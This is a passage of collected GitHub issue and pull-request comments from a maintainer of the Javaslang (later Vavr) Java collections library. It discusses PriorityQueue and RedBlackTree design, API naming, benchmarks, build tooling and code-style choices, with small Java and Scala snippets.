following:\njava\nQueue -> PriorityQueue -> LinearSeq -> Seq -> ...\nwhere Queue is a class and PriorityQueue is an interface.\nBut Java has\njava\nPriorityQueue -> Queue -> ...\nwhere Queue is an interface and PriorityQueue is a class.\n\nAt a first sight we might think that PriorityQueue -> Queue goes adhere with SortedSet -> Set. But that is not true because Set has no ordering opposed to SortedSet, so SortedSet is special in this manner. \nQueue has a special ordering, so Queue -> PriorityQueue is the right way to do it. This goes well along with the fact that we do not have to change the ~~current collection hierarchy~~ existing collections.\nJust wanted to clarify it a bit.\n. Great! I'm really looking forward to it :-) You can add your PR at an early stage and push your commits from time-to-time. I will guide you if there are any questions.\nI've thought a little bit harder about the type hierarchy. The idea I sketched above is not the best solution. E.g. when having a method comparator() (similar to SortedSet.comparator()) our current Queue cannot implement it in a way that makes sense. There are also other examples where it makes no sense that Queue implements specific methods of PriorityQueue (like special map and flatMap methods that take a Comparator for the result type). So Queue cannot inherit PriorityQueue.\nJust don't think too much about it, we start implementing the PriorityQueue as you suggested. It will directly inherit from LinearSeq for now.\n\nMaybe we introduce later a common interface for Queue and PriorityQueue. The best name for that interface would be Queue. Our current class Queue needs then a different name but that is not possible because of backward compatibility. So we will introduce a 'hidden' (read: package private) interface (e.g. QueueLike) that may be renamed when releasing the next major Javaslang version (3.0). But that is not important for now. We concentrate on implementing the PriorityQueue.\n. @paplorinc That sounds great - looking forward to the review. I will assign you...\nUpdate: Before I can assign you, you need to follow the invitation to the Javaslang team :)\n. @pivovarit The current impl of the size method and the Node constructor look good to me! Let's get the PR through the door by cleaning up a bit. We have three similar methods (which is ok): nodeCount, size and length. Let's do the following:\n1) remove size() method in Tree, Node and Empty because it is implemented in Traversable as follows:\njava\ndefault int size() {\n    return length();\n}\n2) unify nodeCount() and length() methods by changing the default impl in Tree as follows:\njava\ninterface Tree<T> ... {\n    default int nodeCount() {\n        return length();\n    }\n}\n3) remove Tree.length() default impl and implement Node.length() and Empty.length() the same way Node.size() and Empty.size() was implemented before:\njava\ninterface Tree<T> {\n    class Node<T> implements Tree<T> {\n        int length() { return size; }\n    }\n    class Empty<T> implements Tree<T> {\n        int length() { return 0; }\n    }\n}\nMany thanks!\n. Hi @sajit, thanks for your contribution! The code looks good to me. I will merge it when the javadoc is updated. I think it is sufficient to update the @return tag like this s/array/Seq/:\njava\n/**\n * ...\n * @return the Seq of strings computed by splitting this string\n * around matches of the given regular expression\n * ...\n. @sajit thanks for your contribution and for updating the docs!\n@paplorinc you're right - naming commits appropriately helps. I'm also a candidadate to take more care here ;-)\n. Hi @geolich, thx for using Javaslang. I haven't heard about that specific problem yet. It might be a known AWS Lambda problem that is not related to class names but to packaging of dependencies.\nPlease take a look at this: http://stackoverflow.com/questions/32782980/aws-lambda-noclassdeffounderror\nThere are links provided how to use the maven-shade plugin to circumvent that problem.\nGreets\n- Daniel\n. Thx!\n. Hi Pap,\nI have thought about this PR a while. Your optimizations are well thought through. The code size reduces by using whenIsNotEmpty but we create an additional Supplier instance. This changes the runtime behavior of our collection. I'm afraid, therefore we can't apply that specific change of this PR.\n. Pap, I thank you! That was really fast. Your ideas are great. I think together we can bring Javaslang forward in the right direction.\nI'm really looking forward to BitSet and PriorityQueue!\n. As stated on the PR, the code size is reduced by applying this change but we create an additional Supplier instance. This changes the runtime behavior of our collection. I'm afraid, therefore we can't apply this change.\n. Nice idea. Basically we align to Scala (type hierarchy and naming). Looking at Haskell is better in terms of impl details because it is more clean/pure. However, when it comes to recursion we use iteration with mutable local method vars instead.\n. Hi @manu-m,\nyes, that is a good suggestion. I can't come up with a better solution.\nLet's only take an additional Supplier<? extends Throwable> into account (to keep the number of filter methods small) as second argument for two new methods: filter(Predicate, Supplier) and filterTry(CheckedPredicate, Supplier).\n. It would be great to hear the opinion of @ruslansennov (currently in holidays). He created the Multimap. We talked about the interfaces and decided to inherit from Traversable instead of Map. I think the conflicts cannot be solved (with Java's type system). But let's wait to hear from Ruslan.\n. I think separating the interfaces is overkill. Let's keep it as simple as possible. I will close this issue for now. If it is really needed we may reopen it.\n. I think the intersperse method is correct. My test:\njava\nGen<Integer> gen = Gen.of(0).intersperse(Gen.of(1));\nRandom rnd = new Random();\nfor (int i = 0; i < 10; i++) {\n    System.out.print(gen.apply(rnd));\n}\nOutput:\njava\n0101010101\n- as expected.\n. yes, one of the rare embedded assignment usages - for me ok here.\n. Nice! Also the removed.contains(element) with be O(log n) instead of O(n) then.\n. We need to publish the jars to Maven central, see http://central.sonatype.org/pages/gradle.html\nAdditionally we have\n- a self-written code generator written in Scala that is executed before Java compile. With Maven we use the scala maven plugin but we are able to execute only scripts. With a Gradle build maybe it is possible to remove the code duplications of the Scala code generators in each Maven module.\nSome minor things:\n- we check interface changes between github tags with a maven plugin\n- we check for version updates of dependencies and Maven plugins\n- ...\n. We need to commit them to see changes on code reviews (one line in the generator might change thousands of lines in code).\nI decided to commit them once because. Users should be able to browse the actual code online.\n. @Conorrr yes, I would really appreciate it!\nMaybe it should be done in smaller steps:\n\nEarly open a PR for discussion\nMake a multi module Gradle project and focus on the Java build\nChange the .travis.yml for CI builds accordingly\nAdd the existing Scala generator if possible\nMake it releasable. Currently we use OSS Sonatype. I don't know if there is a better alternative?\n\nFinally we are able to merge the PR.. Done in master (for one module). Others will have to follow now :). If I had the chance to create a new language, I would do it this way. But I think it is important to be consistent with Java and Scala. Both return -1 in literally every indexOf method, see http://www.scala-lang.org/api/2.11.7/index.html#scala.collection.Seq@indexOf(elem:A,from:Int):Int.\nAlso the API for 2.x releases should stay fixated. The OSGi aficionado have an eye on us :) API changes will break backward compatibility.\nMaybe this is something to think about for the next major release.\n. I understand your point but I prefer to stay consistent with Java and Scala. indexOf is just a read-operation. Creating an Option instance and boxing the int may have negative implications. As I said, it may be part of the next major release.\nPlease note that Scala collections are also reworked (currently targeted for Scala 2.13). Our goal is to align Javaslang 3.0 collections to Scala 2.13 collections.\n. As an alternative we could additional methods indexOfOption. We would preserve the regular Java/Scala behavior and offer a new approach at the same time.\nWe create default methods in Seq (for all parameter variations):\n- indexOfOption\n- indexOfSliceOption\n- indexWhereOption\n- lastIndexOfOption\n- lastIndexOfSliceOption\n- lastIndexOfWhereOption\nThese are quite some methods but they have to be only defined once within Seq, e.g.\njava\ndefault Option<Integer> indexOf(T element) {\n    final int index = indexOf(element);\n    return (index == -1) ? Option.none() : Option.some(index);\n}\nEach *Option method should call its dual non-optional partner.\n. Great!\nCharSeq is A IndexedSeq, should be ok. If there are others (I don't think so) we have to duplicate code or move the impl to Collections. I would not introduce an additional interface to mix in the default method into unrelated types...\n. Yep.\n. Ongoing task, will move it to 2.2.0\n. This is an acceptance criteria, not an issue. The current coverage of Vavr 1.0 is 100%. We will try to keep it that way.. Great idea!\n- force braces for if/while/for etc?\nYes\n- <p> for empty lines in JavaDoc?\nYes\n- align parameters in JavaDoc?\nYes\n. (btw - I applied the label \u2b50 because the is no other label matching. In general I label issues with \u2b50 that are important or of special interest.)\n. One of the most important things I'm concerned with is preserving newlines. This drove me crazy in the past (hello Eclipse Formatter). IntelliJ IDEA's Formatter does a great job here.\nIn particular it is important for nested lambdas, Javaslang's Match API, ...\n. However, the whole checkstyle & formatter infrastructure + code quality measure based on formatting rules is contra-productive - at least in the projects at $work. It hinders the team of being productive and focusing on the real work.\nConcise and correct code + a great test coverage are the key for a healthy code base. We should primarily focus on that.\nI want to keep things as simple as possible by having IntelliJ IDEA as main IDE for contributing to Javaslang. We need a well-defined formatter here.\nThis is how I see codestyle rules in real world development (as distinction of code covered by style-checker (left) and real world programming (right)):\n[pain in the ass [helpful] not covered]\n. Yep, would you do that?\nAfter defining the formatting rules that make sense\n- reformat the whole code-base (include: { .java, maybe .xml, ...}, exclude: { *.scala })\n- mvn clean test to restore generated files\n- export the IDEA settings and overwrite the old ones within .ide/ (please take a look/update the .ide/README.md)\n. Instead of integrating it directly in the build maybe it is possible to create a quality report. The report could cover\n- code style (our own rules, not too complicated. the [list above] is a nice start)\n- findbugs, pmd, etc.\nIt would be great if the committers are automatically informed via email if a PR decreases the code quality.\nWe already have an issue for that (#1229).\nOn a side-note: I'm not convinced we should move to Gradle. Some love it, some hate it. Maven is still a the standard/most used build tool for Java and it works fine for us, so why change it? There is no necessity to do it. What I do not like about Gradle is that it is not fully declarative and is somehow like Ant.\n. We've done some effort in the past to clean up our code. There is an issue to add findbugs/codestyle to our builds. Maybe https://github.com/TouK/sputnik can also help!\n. Great, many thanks!\n\nalthough I don't like javaslang's style of unit test\n\nLet's improve it where possible...\n. Thanks!\n. Awesome, thanks. Now you have a new nickname - The Wolf aka The Cleaner\n\n. You will!\n. :laughing: \n. Thanks!\n. Awesome, great work!\n. This looks great! I had to think about it a while but finally we have it :-)\nGreat work (javadoc, junit, the minor fixes et al.)!\n. Hi Manuel,\nI like the idea - this makes sense! The name is great.\nPull requests are welcome :-) If you do not feel comfortable with the generator I can get my hands on it - just give me a sign.\n. Sounds great :) Here are some hints:\nThe generator is a big String-template that expands. The two most essential helpers are:\n- Extended multi-line strings: xs\"\"\"...\"\"\". I've written a function that aligns those Strings automatically. So we need no other pretty printer.\n- There are various Strings, Boolean and Range extensions (via implicits). Scroll to the bottom of the generator javaslang/generator/Generator.scala - there are they listed. Some parameters are optional, like separators.\n``` scala\n// = <1><2><3>\n(1 to 3).gen(i => s\"<$i>\")\n// = <1>\n// <2>\n// <3>\n(1 until 4).gen(i => s\"<$i>\")(\"\\n\")\n// = test\n(1+1 == 2).gen(\"test\")\n// (does nothing)\n(0 == 1).gen(\"test\")\nxs\"\"\"\n  Just text\n  ${/ code /}\n  text again\n\"\"\"\n```\nScala code is aligned by 2 spaces, generated Java code is aligned by 4 spaces.\n. Fixed with #1385\n/cc @valery1707 thx for the hint!\n. cool, I'm also impressed!\n. ... and the unit tests (which are not published at all, yet - even for releases)\n. Ruslan has done it already for GWT support.\n. Thx!\n. Hi Eduard,\ngreat Idea! I'm really looking forward to your PR!\nLet's call the methods *Entry (e.g. higherEntry) to maximize the recognition value / to align it to the original Java 8 method names. (It does not make a difference that we return a Tuple2 instead of an Entry.)\n. I prefer not to provide alternatives to give a clear path to do things. We currently have one exception: length() and size()\nI've read a bit ... Daniel C. Sobral writes that a persistent version can't have back references. Therefore we need an ordering. The ordered collections of Javaslang are based on a RedBlackTree. Is there an efficient way to seach neighbors in a binary tree?\nrmleon/GorillasCollection has an example of a NavigableMap interface.\n. :+1: for not naming the methods *Entry\n. Hi @eduardmanas,\nthat sounds great! +1 for implementing Option0. Internally Scala does also prefer more optimized implementations over the most concise/purely function. It is absolutely ok to use null!\nI'm not 100% sure if we really need a NavigableMap interface. Since TreeMap is the only implementation we could also place the methods within SortedMap. Is there a chance that there will be a SortedMap implementation that will not implement NavigableMap. Does there exist anywhere out there such an implementation?\nBtw - if you don't mind, I would also commit the benchmarks of floorJava and floorOption0. This will be a good showcase.\n. @paplorinc +1 for using else if and ordering the cases by <, == and >. /cc @eduardmanas \n. @eduardmanas Yes, that makes sense. Let's place it in the SortedMap interface as long there is no real reason to split that interface.\n. > I prefer <, >, ==, and here is why.\nGo ahead and choose the solution that makes most sense. It is good to keep rules in mind but we should choose different ways to do s.th. when it makes sense. There is no 'on size fits all'.\n. @eduardmanas Yes, I see. Changing the contract of Traversable min/max will change the semantics but it would be more intuitive to use the underlying comparator, if present.\nI think this can be seen as bug. Very nice catch! I created an additional issue: #1304\n. Nice, thank you!\n. @eduardmanas TreeMap and TreeSet use the RedBlackTree as backend. I think there the min (minimum) and max (maximum) functions work correct. These should be used...\n. Great! No, there are no others.\n. Sorry for being so silent the last days. I also think that using an ArrayDequeue should be ok if the mutability does not leak out. Please keep in mind that we get thread-safety for free when using immutable, persistent data structures. We have to ensure that different versions (e.g. when adding or removing elements) of our collections are still  persistent (i.e. the previous version does not change).\nIterators are inherently mutable and (in our case) not thread-safe. Here it is ok to use the fastest implementation possible.\n. @nfekete @paplorinc @eduardmanas I'm the reason for the stall - more specifically the lack of time. Eduard did a great job. I was not satisfied with the changes to the low-level data structure RedBlackTree and worked on an alternative solution. I had a 'nearly finished' version at hand that only missed one method (that could be shipped in a preliminary O(n) version). Eduard meanwhile came up with the suggestion to optimize the RBT in the way that the empty tree is represented by null. I wanted to fix that first. Now I only need time.\nHere is the current state of the branch: https://github.com/danieldietrich/javaslang/blob/RedBlackTree/javaslang/src/main/java/javaslang/collection/RedBlackTree.java#L1204\nIf we can get rid of the Empty RBT, then we do not need AbstractTree and Node any more. There will be only one class RedBlackTree (and the DescendingTreeView aka ReverseRedBlackTreeView).. Wow, this is interesting. Yep, toString4 :-)\nMaybe we should eliminate String.format everywhere...\n. Thx!\n. I want to merge now. Aggreed @paplorinc ?\n. Fixes #1293 \n. Yep, I think Ruslan is right, we need to live with that caveat. There is a reason for that:\nScala's type hierarchy is different, Iterable extends Traversable and Iterator extends Traversable. Especially Iterator is not an Interable.\nIn Javaslang Traversable extends Iterable and Iterator extends Traversable. Especially Iterator is an Iterable.\nBecause of this difference and the fact that Iterator is stateful, we cannot create a new Iterator based on an Iterator.\n. > Iterator needs to keep a reference to the sequence it was created with, that's how it can create new iterators on every call.\nI'm not sure if this is possible. Trying to find a counter-example now...\n. Example:\n``` java\nfinal int[] i = { 0 };\nIterator iter = new Iterator() {\n@Override\npublic boolean hasNext() {\n    return true;\n}\n\n@Override\npublic Integer next() {\n    return i[0]++;\n}\n\n};\n``\n. We neededIteratorto create Set and Map impls in an efficient/concise way. Basically you are right. But if we forget what we know from Scala, the [java.util.Iterator API](https://docs.oracle.com/javase/8/docs/api/java/lang/Iterable.html#iterator--) does not say that subsequent calls ofiterator()` have to iterate the same elements. Actually the javadoc says:\nReturns an iterator over elements of type T.\nThe focus is on\n... over elements ...\nIn our case the elements are 'eaten'. A second iterator() will not have any elements. But is this really a problem? Or is it a problem that we expect it to work differently because of Scala? Maybe it is sufficient to clarify the behavior.\nI think Scala has a similar problem because List and Iterator are both TraversableOnce. But Iterator has the following limitation (from the Scala docs):\nIt is of particular importance to note that, unless stated otherwise, ''one should never\nuse an iterator after calling a method on it''. The two most important exceptions\nare also the sole abstract methods: `next` and `hasNext`.\nIf we assign an Iterator to a val of type TraversableOnce, we don't know if we are allowed to make subsequent method calls which lead to a defined behavior...\n. That should be no problem.\nIn order to reduce code duplication we could introduce the interface TraversableOnce like so:\nIterable  (Convertible)\n       ^   ^        ^\n        \\ /         |\n       Value (TraversableOnce)\n          ^   ^             ^\n           \\ /              |\n       Traversable      Interator\n            ^ \n           /|\\\n       Seq Set Map ...\nUpdate: I added the Convertible interface which contains the conversion methods toList() etc. Additionally the interfaces Convertible and TraversableOnce should be package-private / hidden because they exist only to reduce code duplication.\n. ## Notes\nWith #1810 we need to adjust which classes of the Traversable type hierarchy explicitly extend Serializable:\n\nTraversable will extend Serializable\nAll other collection interfaces and classes will not (explicitly)\n\nThe calls ofAll(iterator) will be replaced by ofAll(() -> iterator). Done on the v1.0.0 branch. See also the blog post \"Purifying the API Surface Area\".. Let's just adjust the return type in a 3.0.0 branch as described here. That is a major design decision for the future development of Javaslang.\n(I will create the 3.0.0 branch soon...)\n. @paplorinc deprecating the one and adding the other is ok for me. It is a good hint that it will change. 3.0 will clear it up. If no-one has another opinion I will merge (when I return to the keyboard in two hours or so)\n. Thx for reply\n. Thx!\n. Hi @hugree,\nthe javadoc of CompletableFuture says:\n\nIf any of the given CompletableFutures complete exceptionally, then the returned CompletableFuture also does so, with a CompletionException holding this exception as its cause.\n\nSo the current behavior you observe, that no more results are produced, is correct.\nI suggest to use Javaslang's Future:\n``` java\n// using javaslang.collection.Stream\nStream> futures = Stream.of(s1, ..., sn).map(Future::of);\nFuture> result = Future.sequence(futures);\n// using an arbitrary Iterable\nIterable> futures = java.util.stream.Stream.of(s1, sn).map(Future::of).collect(Collectors.toList());\nFuture> result = Future.sequence(futures);\n```\nwhere s1, ..., sn are of type CheckedSupplier<String>.\nHope that helps!\nGreets,\nDaniel\n. Related to javaslang-circuitbreaker, therefore closed here (different project).\n. Hi Pap, where do we use these methods? Does another PR follow? Generally we should only add internal code if we use it - otherwise it is dead code.\n. Hi Pap,\nthank you - it is awesome how fast you provided a first implementation! I followed your changes and comments but hadn't the time to dive into it, yet. I need some sleep, so I think I can get a deeper look tomorrow. I'm sure we are able to use your draft to create a great PriorityQueue.\nWow, factor 2300 - unbelievable :) I'm looking forward into profiling it. If inserts and pops are equally distributed there were round about 25K inserts. If we ignore the pops, 1 insert costs 1.68 ms. How much is the cost to create an Object in Java? I guess it is way below 1 ms but I'm not sure - we have to measure.\nAlso interesting would be to duplicate your benchmark and see how Javaslang List performs regarding prepend instead of insert and tail instead of pop. Could you do that, please? The List is one of the simplest persistent data structures. If it performs similar to our PriorityQueue impl, it is not possible to make the PriorityQueue much faster.\nPlease check in all benchmarks in the benchmark module (if not done already).\nSleep well!\nDaniel\n. @paplorinc After a force push your comments disappear. I'm then not able to answer specific comments I received via email (github notification) and the history gets lost. I don't think force push is the best way for handling code reviews of PRs.\nFor example this comment is gone now:\n\nWill add them back and add an @Override :) (in 3.0 we can simply delete the overridden impls)\n. > I profiled it already and the comparator was going crazy, crashing with stack overflow, even though it had only ~5 elements.\nIt had something to do with the SerializableComparator, replacing it with a simple Comparator reduced the speed difference to only 10x slower (and I don't get stack overflows anymore) ... Further optimizations reduced the difference to ~6x slower.\n\nI use the SerializableComparator already in the RedBlackTree implementation, made some tests and didn't recognize any performance issues. We need the Comparator to be Serializable in order to make our collections serializable/send them over the wire. If we see a problem with serializability we should remove it in 3.0.0 from the whole library. But before we do it I want to understand why it is so much slower. Is it a Java bug? Because of type erasure there has to be different bytecode. Using javap and diff should show how the two versions (serializable/not serializable) differ. This needs to be further investigated/understood.\n. > Since there were no comments for the modified lines, I force pushed the change :)\nNow I understand, thanks for the explanation. It is ok how you handle it via force push.\n. @paplorinc \n\nJMH banchmark against Java's (mutable) and ScalaZ's (immutable, based on the same paper) ...\n\nThe results are really awesome! I've read that Scala 2.12 makes internally use of Java 8's lambdas and will get significantly faster. It will be interesting to check the benchmarks again once Scala 2.12 is out (and Scalaz is re-compiled against it).\n. @eduardmanas Hi Eduard, thanks for your investigation and your suggestions!\n\nAs a suggestion, I would create a PriorityQueueBenchmarkWrapper scala class with the logic to enqueue and dequeue all those elements in bulk.\n\nMaybe static methods are sufficient, s.th. like enqueue(scalaInstance, elements). There is a good chance that the byte-code gets inlined. I would try to stay as pure as possible in order not to add too much noise to the benchmarks measures. If it helps to wrap Scala types and we are sure it does not have an impact to our measures, we should do it.\n\nPersonally, I would find more interesting if we compared against mutable.PriorityQueue.\n\nBoth is interesting. If possible, we should do both.\n\nI am planning something similar for the TreeMap benchmark test as well.\n\nGreat! Looking forward to it. JMH is a burner!\n\nAnother suggestion is to split the benchmark for enqueue and dequeue.\n\nThat's important. We need to measure the main API clearly separated. Having real-life tests is also great (adding and removing elements in one test). Sometimes we see surprises here...\n\nHowever, the interesting bit is that the JavaSlang performance deteriorated dramatically with very large collections (92x slower than Java).\n\nWe need to understand this and ensure there are no leaks. GC is turned out, right?\n\nFinally, my last comment is to rename the benchmark class from SlangPriorityQueue to PriorityQueueBenchmark.\n\nYes, +1 for removing 'Slang' prefix and add 'Benchmark' postifx!\n. Woohoo :) The benchmarks are really worth the effort!\n. The technical implementation looks very nice! I will read further tomorrow to find things we might adjust.\n. I think the PriorityQueue implementation is pretty mature now. I will sleep one night over it and see tomorrow if there is still s.th. missing. Then we should pull this brand-new collection in :)\n. @paplorinc alright, she should be first on your PriorityQueue ;) \n. There's no hurry - we will take our time!\n. And now it is time to merge. This one has one of the highest Javaslang-activities I think :) Awesome work!\n. That's not correct. Multiple onXxx calls (e.g. onComplete) currently may lead to an execution where all actions are executed in parallel.\nThe andThen method works different. It returns a new Future that is resolved after the actions completed. Given that, several actions are executed sequentially, not concurrently.. (Off topic: Again it is time to sleep for me - I will go on tomorrow. Today I started reading about PriorityQueues, next is the paper you referenced...)\n. Thank you Pap, looks great.\n. Haha, will do :-) Thanks for the hint, L\u0151rinc!\n. Hi Masich, many thanks for your PR!\nI think Stream is not the right place to add such a special method. We already have CharSeq (similar to Scala's String) for exactly that use-case!\nExample:\njava\nCharSeq.of(\"Hello\");\nAdditionally CharSeq has much more functionality tailored to char sequences than Stream.\nTherefore I will close this PR.\n. Looking forward to your next PR! \ud83d\ude04\n. Oh, sorry! Yeah, good catch. I meant to change the javadoc of Traversable and will change the comment above.\n. I think the reason was the API incompatibility between Set/Seq and Map. Scala also does not have remove* in Traversable. But Scala also has not retainAll as part of Traversable.\nAnother option is to remove retainAll from Traversable...\n. As Ruslan said, sorted methods do not make sense for Sets. Elements have an equal-relation but no ordering.\nAll conversion methods are currently located in Value. If additional conversion methods are needed I would place them there. toSortedSet as shown above looks good to me.\n. My first thought is that we should stay consistent with Scala and do not mix Java and Scala API.\n. As I said, we align to Scala.\nThe use of Defined is redundant, in most cases we will check emptiness before calling get.\njava\nif (option.isDefined()) ... option.getIfDefined()) ... else ...\nAnother reason is that renaming it would have implications, e.g. what to do with these methods:\n- Try.get()\n- Future.get()\n- Either.get()\nAligning to Scala is a clear direction. Making the API half Java, half Scala will lead to pain and suffering.\nI close this ticket to give a clear direction. The Javaslang vision is to converge Java towards Scala, not the opposite direction.\n. As described in #1309 these methods should work exactly as in Scala, especially the corner cases (Infinity, NaN, ...).\n. Interesting observation regarding that Scala's double range is backed by Double (is it?):\n``` Scala\n  val r = 0d to 4d by 0.1                         //> r  : scala.collection.immutable.NumericRange[Double] = NumericRange(0.0, 0.1,\n                                                  //|  0.2, 0.30000000000000004, 0.4, 0.5, 0.6, 0.7, 0.7999999999999999, 0.89999999\n                                                  //| 99999999, 0.9999999999999999, 1.0999999999999999, 1.2, 1.3, 1.400000000000000\n                                                  //| 1, 1.5000000000000002, 1.6000000000000003, 1.7000000000000004, 1.800000000000\n                                                  //| 0005, 1.9000000000000006, 2.0000000000000004, 2.1000000000000005, 2.200000000\n                                                  //| 0000006, 2.3000000000000007, 2.400000000000001, 2.500000000000001, 2.60000000\n                                                  //| 0000001, 2.700000000000001, 2.800000000000001, 2.9000000000000012, 3.00000000\n                                                  //| 00000013, 3.1000000000000014, 3.2000000000000015, 3.3000000000000016, 3.40000\n                                                  //| 00000000017, 3.5000000000000018, 3.600000000000002, 3.700000000000002, 3.8000\n                                                  //| 00000000002, 3.900000000000002, 4.000000000000002)\nimport java.math.BigDecimal\n\nvar list: List[Any] = List()                    //> list  : List[Any] = List()\n  var b = BigDecimal.valueOf(0d)                  //> b  : java.math.BigDecimal = 0.0\n    val step = BigDecimal.valueOf(0.1d)       //> step  : java.math.BigDecimal = 0.1\n  while (b.doubleValue() <= 4d) {\n      list = list :+ b.doubleValue()\n      b = b.add(step)\n  }\n  println(list)                                   //> List(0.0, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0, 1.1, 1.2, 1.3, 1\n                                                  //| .4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0, 2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8, 2.\n                                                  //| 9, 3.0, 3.1, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, 3.8, 3.9, 4.0)\n```\n. I think this PR is also ready now to be pulled in. I will get a last look at the source tomorrow...\n. Thanks!\n. Stopping before end can be considered as bug. I will change the label of this issue accordingly.\nI think Scala's approach is the best. It is performing the calculation exactly in the manner as expected and projects the result into the space of doubles. This is the best we can do.\nIt is like a 3d rendering scene projected on a 2d display. There's a loss of information but our brain interprets it as correct when looking at the pixels. If we would change the algorithm (linear transformation of vector matrices), we could fit the pixel space better but the visual perspective is not natural any more and our brain will interpret the rendered scene as wrong.\nInterpolation of the real world is the way to go, not changing how the real world behaves.\n. Great, thank you!\nOfftopic: I ask myself why we are not checking if the current Value is of the type we convert. E.g. Set.toSet() should return this. But this is should be done in another issue...\n. Thx!\n. Value isn't part of Vavr 1.0 anymore.. Note: It would be more functional to switch the arguments if we had curried argument lists in Java (like in Scala):\njava\n// zip = stream1.zipWith(f); zipped = zip.apply(stream2);\ndefault <U, R> Stream<R> zipWith(BiFunction<? super T, ? super U, ? extends R> combiner)(Iterable<? extends U> iterable) {\n    ...\n}\nor have a static method to obtain a curried form:\njava\n// zip = zipWith(f); zipped = zip.apply(stream1, stream2);\nstatic <T, U, R> BiFunction<Stream<T>, Stream<U>, Stream<R>> zipWith(BiFunction<? super T, ? super U, ? extends R> combiner) {\n    ...\n}\nBut since Java is an object-oriented language, this seems more natural:\njava\n// = stream1.zip(stream2).map(t -> f.apply(t._1, t._2))\nstream1.zipWith(stream2, f);\n. Yes, thx, will close it.. To circumvent backward compatibility issues @talios suggested to return Iterable by default methods.\ncombine() appears to be the same as zipWith() - see #1313\n. Value isn't part of Vavr 1.0 anymore.. All Values have isDefined(). isNotEmpy() would be an alias, similar to length() and size(). Just saying, but it makes sense for collections to have that name.\n. @valery1707 you are completely right. This issue can be closed.\nValue has isEmpty and isDefined. The latter is meant to reflect the non-empty state, especially for single-valued types.\nTraversable inherits isEmpty and isDefined and adds nonEmpty for multi-valued types.\nThese method names are common in Scala.\n@paplorinc I have to admit that I forgot to mention that we have nonEmpty already. Sorry! The point in the comment you are referring is, that we do not need additional API (with non-empty semantics) within the internal, non-Traversable collections like HashArrayMappedTrie or RedBlackTree.\nThank you for your engagement and keep up the great work!\n. Hi Eduard, I need some time to dive into the details. Tomorrow I'm at a wedding, Sunday I can go further into it. Without diving into the details now I remember that Empty carries the Comparator. But empty is reused because each Node knows the Empty node. We need the empty Node to be able to access the current Comparator. But that's an implementation detail. If you've found a way to do it more efficient with null values that is absolutely ok! I implemented the RedBlackTree based on a Haskell paper. I'm sure the Java implementation can be further optimized!\nI think replacing Empty with null will decrease the code readability because the calls of Empty methods need to be replaced by extra checks for null...\n\nFor the life of me, how can the Java implementation be twice as fast!\n\nDoes it make a difference if we access Node.left instead of Node.left(). But I think the compiler may already inline it behind the scenes.\n. Hi @eduardmanas, hi @paplorinc, you guys are really awesome :) It takes me hours to read through all the email notifications and follow your changes :-))\nRegarding a consistent benchmark/reporting impl:\nI'm not fully understanding the purpose of the JMH @Group annotation. Reading http://stackoverflow.com/questions/30118050/what-does-group-and-groupthreads-refer-to-in-jmh it seems that it is used for asymmetric benchmarking but I can't find a good explanation what it is. We should ensure that there are no side-effects regarding the measuring. Both of your implementations should produce exactly the same results, right?\nI like the benchmark output of @eduardmanas.\nWhat do you think of taking the subclassing approach of @paplorinc (not using the @Group annotation) and adding the detailed + ration output of @eduardmanas?\n. @eduardmanas wow, many thanks! I think I also need to pull that beast to read the code in the IDE ;-)\n. @eduardmanas it is ok this way - I will review it!\n. Hi, I'm still on it. Sorry that you had to wait! This PR is really big. I've checked out your branch into my IDE and checking now the 4000 LOC. I will provide comments over the next days...\n. This weekend I will be able to finish the review.\n. I made good progress in reviewing this PR but still need some time to investigate the RedBlackTree additions. This evening I will go on...\n. I started to reorganize RedBlackTree a bit in a local branch while preserving all of your logic. Now I only need to fully understand subMap. I will go on with it the next days.\nHave great holidays!\n. Short status: I'm playing around with the impl. Sorry for taking so long. This PR is really huge. But it is necessary to get it right.\nMy local version (still heavily under construction):\n- Simplifies RedBlackTree to have only two impls Empty and Node. This saves us from many headaches and keeps the core data structure nice and clean.\n- Adds only ceiling/floor, higher/lower and descendingIterator to RedBlackTree\n- Moves the DescendingTreeView logic to TreeMap, because it is the only implementation and it will greatly simplify the implementation\n- Removed all Node type casts from RedBlackTree\nI will go on in this direction and prepare a PR for you. Then we can compare our impls and talk about it. It may still take a few days. RedBlackTree is nearly finished. Then TreeMap needs to be changed and some unit tests might need to be moved from RedBlackTreeTest to TreeMapTest - I will see.\n. Hi @eduardmanas,\nI've completely changed the RedBlackTree impl (see https://github.com/javaslang/javaslang/compare/master...danieldietrich:RedBlackTree?expand=1). Should I create a PR into your branch now?\nRedBlackTree.subTree is still not implemented. In a first step I would provide a simple linear impl by scanning for start and end and creating a new RedBlackTree of all elements. Having a subTree view is not memory efficient.\n. Ok, I think it is a good idea to leave the sub views for a later PR to keep this PR a little smaller.\nI will perform some minor additional changes to my refactored version of the RedBlackTree with focus on passing the current comparator the the helper methods. This ensures that all tree operations result in a tree with the same comparator, especially when a second tree is involved that has a different comparator.\nI can finish that today. It would be best if you could use my file versions because I already moved some methods to the right place etc. Your code remained the same with the exception of the RedBlackTree changes. I will take care of preserving all your Javadoc!\nNext will be the sub views and the navigable Set. For other collections we decided not to implement views that keep all underlying elements. The memory footprint at runtime matters. E.g. when having a Map that contains 1.000.000 entries and we create a sub map of 1 entry, we do not want to keep 1.000.000 elements in memory in the case the original map is not referenced any more after that operation.\n. > I can finish that today.\nUpdate: Did not found the time - will go on tomorrow...\n. Most work is already done. I need to finish #1535 first (I'm already working on it).. No, undead - it will raise from the buried again :). Hi @codesourceress, thanks for asking. It will take a while because it will be shipped as part of Vavr 1.0 which is in the make. However, the overall changes to the lib take time.. @io7m an implementation requires the following:\n\nAdd method shuffle() to Seq and all subtypes of Seq. The method has the return type of the declaring class.\n\n```java\ninterface Seq {\n    /*\n     * \n/\n    Seq shuffle();\n}\ninterface LinearSeq extends Seq {\n    @Override\n    LinearSeq shuffle();\n}\n// ... and so on\n```\nThe implementing classes delegate to javaslang.collection.Collections:\n```java\nfinal class Collections {\n    static > S shuffle(S source, Function<? super Iterable, S> ofAll) {\n        if (source.length() <= 1) {\n            return source();\n        } else {\n            final java.util.List list = list.toJavaList();\n            Collections.shuffle(list);\n            return ofAll.apply(list);\n        }\n    }\n}\ninterface List extends LinearSeq {\n    @Override\n    default List shuffle() {\n        return Collections.shuffle(this, List::ofAll);\n    }\n}\n```\nNote: I did not compile the code 